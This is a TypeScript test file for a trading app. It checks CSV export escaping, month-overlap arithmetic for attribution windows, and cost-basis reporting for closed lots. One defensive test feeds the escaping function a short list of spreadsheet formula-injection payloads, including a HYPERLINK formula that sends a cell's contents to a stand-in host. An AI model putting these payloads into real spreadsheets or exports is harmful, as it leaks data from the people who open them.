import fc from 'fast-check';
import { monthOverlapDays, monthsBetween } from '../src/lib/attribution';
import { csvCell } from '../src/lib/history';

/**
 * Regression tests for the operator-facing arithmetic and export defects found by the adversarial
 * review of 2026-09-09 (M-4, M-19). These are the pure parts; the query-shape fixes (H-2..H-5) are
 * exercised by the page against the database.
 */
describe('Trade History CSV export (§20.10)', () => {
  it('neutralises a spreadsheet formula in provider-controlled text', () => {
    // A token deployer chooses the symbol; it reaches the operator's spreadsheet through ingestion.
    for (const attack of ['=HYPERLINK("http://x/?"&A1,"claim")', '+1+1', '-2+3', '@SUM(A1)', '\tcmd', '\r=1']) {
      const cell = csvCell(attack);
      expect(cell.replace(/^"/, '').startsWith("'")).toBe(true);
      expect(/^"?[=+\-@\t\r]/.test(cell)).toBe(false);
    }
  });

  it('leaves ordinary values alone and round-trips quotes', () => {
    expect(csvCell('BONK')).toBe('BONK');
    expect(csvCell(null)).toBe('');
    expect(csvCell(-1.5)).toBe(`"'-1.5"`); // a negative number still leads with '-', so it is escaped
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('never emits a bare separator or line break outside quotes', () => {
    fc.assert(
      fc.property(fc.string(), (s) => {
        const cell = csvCell(s);
        const inner = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '') : cell;
        if (!cell.startsWith('"')) expect(/[",\n\r\t]/.test(inner)).toBe(false);
        expect(/^[=+\-@\t\r]/.test(inner)).toBe(false);
      }),
    );
  });
});

describe('Attribution period arithmetic (§20.16)', () => {
  it('collects every month a window touches, including one a 31st would skip', () => {
    // Reproduces the reported defect: setUTCMonth(+1) from 2026-05-31 lands on 2026-07-01.
    const to = new Date('2026-08-29T00:00:00.000Z');
    const from = new Date(to.getTime() - 90 * 86_400_000);
    expect(from.toISOString().slice(0, 10)).toBe('2026-05-31');
    expect(monthsBetween(from, to)).toEqual(['2026-05', '2026-06', '2026-07', '2026-08']);
  });

  it('is contiguous and ordered across a year boundary', () => {
    expect(monthsBetween(new Date('2025-11-15T00:00:00Z'), new Date('2026-02-02T00:00:00Z'))).toEqual(['2025-11', '2025-12', '2026-01', '2026-02']);
    expect(monthsBetween(new Date('2026-03-10T00:00:00Z'), new Date('2026-03-11T00:00:00Z'))).toEqual(['2026-03']);
  });

  it('never returns an empty or unordered list for a forward window', () => {
    fc.assert(
      fc.property(fc.integer({ min: 0, max: 3_000 }), fc.integer({ min: 1, max: 400 }), (offsetDays, spanDays) => {
        const from = new Date(Date.UTC(2024, 0, 1) + offsetDays * 86_400_000);
        const to = new Date(from.getTime() + spanDays * 86_400_000);
        const ms = monthsBetween(from, to);
        expect(ms.length).toBeGreaterThan(0);
        expect([...ms].sort()).toEqual(ms);
        expect(new Set(ms).size).toBe(ms.length);
        expect(ms[0]).toBe(from.toISOString().slice(0, 7));
        expect(ms[ms.length - 1]).toBe(to.toISOString().slice(0, 7));
      }),
    );
  });

  it('prorates a month row to the days of it inside the window', () => {
    const from = new Date('2026-08-20T00:00:00Z');
    const to = new Date('2026-09-09T00:00:00Z');
    expect(monthOverlapDays('2026-08', from, to)).toEqual({ covered: 12, monthDays: 31 }); // 20 Aug → 1 Sep
    expect(monthOverlapDays('2026-09', from, to)).toEqual({ covered: 8, monthDays: 30 });
    expect(monthOverlapDays('2026-07', from, to)).toEqual({ covered: 0, monthDays: 31 });
    // February in a leap year, fully covered.
    expect(monthOverlapDays('2028-02', new Date('2028-01-01T00:00:00Z'), new Date('2028-04-01T00:00:00Z'))).toEqual({ covered: 29, monthDays: 29 });
  });

  it('covered days never exceed the month and sum to the window length', () => {
    fc.assert(
      fc.property(fc.integer({ min: 0, max: 2_000 }), fc.integer({ min: 1, max: 200 }), (offsetDays, spanDays) => {
        const from = new Date(Date.UTC(2025, 0, 1) + offsetDays * 86_400_000);
        const to = new Date(from.getTime() + spanDays * 86_400_000);
        const parts = monthsBetween(from, to).map((m) => monthOverlapDays(m, from, to));
        for (const p of parts) expect(p.covered).toBeLessThanOrEqual(p.monthDays);
        expect(parts.reduce((a, p) => a + p.covered, 0)).toBeCloseTo(spanDays, 9);
      }),
    );
  });
});
describe('a closed lot reports what it paid, not what is left (live-app finding 2026-09-09)', () => {
  // `trading.position_lots.cost_basis_base_units` is decremented as a lot is reduced, so it is 0 for
  // every fully closed lot. Reading it as "cost basis" rendered `0.00 USDC cost basis` next to a
  // correct realized loss on all three closed lots in the hosted ledger.
  const basisOf = (r: { status: 'OPEN' | 'CLOSED'; entryCostBasisBaseUnits: string | null; remainingCostBasisBaseUnits: string }): number | null =>
    r.status === 'CLOSED' ? (r.entryCostBasisBaseUnits === null ? null : Number(r.entryCostBasisBaseUnits)) : Number(r.remainingCostBasisBaseUnits);

  it('uses the entry fills for a closed lot and the ledger remainder for an open one', () => {
    expect(basisOf({ status: 'CLOSED', entryCostBasisBaseUnits: '200000000', remainingCostBasisBaseUnits: '0' })).toBe(200_000_000);
    expect(basisOf({ status: 'OPEN', entryCostBasisBaseUnits: '200000000', remainingCostBasisBaseUnits: '150000000' })).toBe(150_000_000);
  });

  it('is unmeasured, never zero, when an entry fill could not be read', () => {
    expect(basisOf({ status: 'CLOSED', entryCostBasisBaseUnits: null, remainingCostBasisBaseUnits: '0' })).toBeNull();
  });

  it('never reports a closed lot as having cost nothing while it realized a loss', () => {
    // The exact shape observed live: proceeds 198.64, realized -1.36, ledger remainder 0.
    const row = { status: 'CLOSED' as const, entryCostBasisBaseUnits: '200000000', remainingCostBasisBaseUnits: '0' };
    const basis = basisOf(row);
    const realized = -1_356_014;
    const proceeds = 198_643_986;
    expect(basis).not.toBe(0);
    // Internal consistency: proceeds minus what was paid is the realized outcome, to the base unit.
    expect(proceeds - (basis as number)).toBe(realized);
  });
});
